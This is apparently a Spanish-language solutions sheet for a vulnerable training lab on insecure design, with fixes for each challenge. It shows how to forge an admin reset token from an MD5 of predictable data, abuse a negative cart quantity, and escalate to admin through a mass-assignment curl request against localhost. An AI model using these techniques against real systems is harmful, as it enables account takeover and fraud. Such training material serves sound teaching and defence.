# A06 – Diseño Inseguro: Soluciones

## Reto 1 – Token de Reset Predecible
El token para `admin` es:
```bash
python3 -c "import hashlib; print(hashlib.md5(b'admincorp2024').hexdigest())"
# → e35b9dc90255e3b7bc5f2e8a21f16d7b (ejemplo)
```
Usa este token en `/a06/reset-password` para cambiar la contraseña del admin sin acceso a su correo.

**Corrección:** Usa `secrets.token_urlsafe(32)` — un token criptográficamente aleatorio de 256 bits.
Almacénalo con un tiempo de vida corto (15 min) en la BD. Nunca derives tokens de datos del usuario.

## Reto 2 – Carrito con Cantidad Negativa
En `/a06/cart`, pon cantidad `-10` para el Laptop ($999.99):
- Subtotal = -10 × $999.99 = **-$9999.90**

La tienda ahora "debe" dinero al atacante.

**Corrección:**
```python
quantity = int(request.form.get('quantity', 1))
if quantity <= 0:
    abort(400, "La cantidad debe ser mayor a cero")
```

## Reto 3 – Asignación Masiva
Inicia sesión como `alice`, luego:
```bash
curl -X POST http://localhost:5000/a06/update-profile \
  -b "session=..." \
  -d "role=admin&balance=99999"
```
El backend ejecuta `UPDATE a06_users SET role='admin' WHERE username='alice'`.

**Corrección:**
```python
CAMPOS_PERMITIDOS = {'email', 'password'}
for campo, valor in request.form.items():
    if campo in CAMPOS_PERMITIDOS:
        db.execute(f"UPDATE a06_users SET {campo}=? WHERE username=?", ...)
```
